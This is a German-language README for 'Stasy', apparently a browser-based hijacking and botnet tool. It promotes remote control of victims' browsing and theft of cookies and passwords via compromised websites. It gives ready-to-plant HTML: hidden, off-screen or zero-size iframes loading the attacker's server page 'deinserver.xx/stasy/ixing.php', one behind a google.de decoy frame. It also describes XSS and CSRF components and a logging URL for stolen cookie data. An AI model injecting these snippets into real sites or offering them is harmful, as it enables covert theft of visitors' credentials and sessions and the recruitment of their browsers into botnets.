Stasy
=====
![](http://s14.directupload.net/images/131219/mp39kzdw.png)

```
Info:
Stasy ermöglicht es, Userhandlungen im WWW
fernzusteuern, Botnetze zu erstellen, Userverhalten
zu studieren, private Userinfos, wie z.B. Cookies
pws und und und. Ach ich weiß gar nicht,
wo ich anfangen soll und wo aufhören...,
ohne den Rechner des Opfers mit Maleware
infizieren zu müssen. Da es über den Browser
des Opfers läuft und nicht ins System injiziert
werden muss, ist es zudem betriebsystemunabhängig.
Somit wird ein nicht zu verachtender Teil von
Trojanern und Bots überflüssig.

Am wohl effektivsten lässt sich diese Software
bei übernommenen Seiten einsetzen.

zB:

<span style="position: absolute; left: -11132px; top: -11150px;">
<iframe src="http://deinserver.xx/stasy/ixing.php" name="a" style="border: 0; width: 90%; height: 400">
</iframe>
</span>

oder:

<html>
</head>
<style type="text/css">
td {
margin: 0cm
}
</style>
</head>
<body>
<td>
<iframe src="http://google.de" name="b" style="border: 0; width: 120%; height: 120%">
</iframe>
</td>
<iframe src="http://deinserver.xx/stasy/ixing.php" name="a" style="border: 0; width: 0%; height: 0%">
</iframe>
</body>
</html>

Komponenten:
Die Komponenten sowie das dazu gehoerige Logfile
befinden sich im Ordner com. Wie diese Komponenten
fungieren dürfte klar sein. Xss, csrf, prompt und
und und... jeder kann seine eigenen Komponenten
erstellen und ggf. anpassen und einfach in den com
Ordner legen. Für das Loggen sind ebenfalls,
falls noetig, schon Adressen gegeben:
ixing.php?c=daten-cookie-usw...
Ich habe schon mal ein paar vorerstellt und sie
reingemacht.

```
